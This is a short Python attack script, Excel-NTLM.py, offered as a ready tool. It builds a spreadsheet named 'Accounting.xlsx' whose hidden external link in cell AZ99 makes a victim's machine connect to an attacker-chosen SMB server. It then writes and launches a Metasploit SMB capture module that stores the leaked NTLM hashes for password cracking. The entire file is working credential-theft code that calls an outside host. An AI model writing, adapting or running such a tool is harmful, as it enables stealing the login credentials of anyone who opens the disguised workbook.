from os import system
import sys
import time
import xlsxwriter


def createXLSX(filename, server, port):
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
	worksheet.write_url('AZ99', "external://"+server+":"+port+"\\share\\[AccountingBook.xlsx]SheetName'!$C$3:$H$6,2,FALSE)")
	workbook.close()
	print("Fichero creado")


def msfListener(ipAttacker, portAttacker):
	resourceFile = open('metasploit.rc','w')
	resourceFile.write('''
use auxiliary/server/capture/smb
set SRVHOST <SERVER>
set SRVPORT <PORT>
set JOHNPWFILE passwords
run
'''.replace('<SERVER>',ipAttacker)).replace('<PORT>',portAttacker)
	resourceFile.close()
	print('[+] MSF Resource file generated ')
	system('msfconsole -q -r metasploit.rc')

def main():
	if(len(sys.argv) < 3):
		print('Usage : Excel-NTLM.py IP_ATTACKER PORT_ATTACKER ')
		print('Example : Excel-NTLM.py 10.10.1.110 445 ')

	else:
		host = str(sys.argv[1])
		port = str(sys.argv[2])
		createXLSX("Accounting.xlsx", host, port)
		msfListener(host, port)

if __name__ == "__main__":
    main()
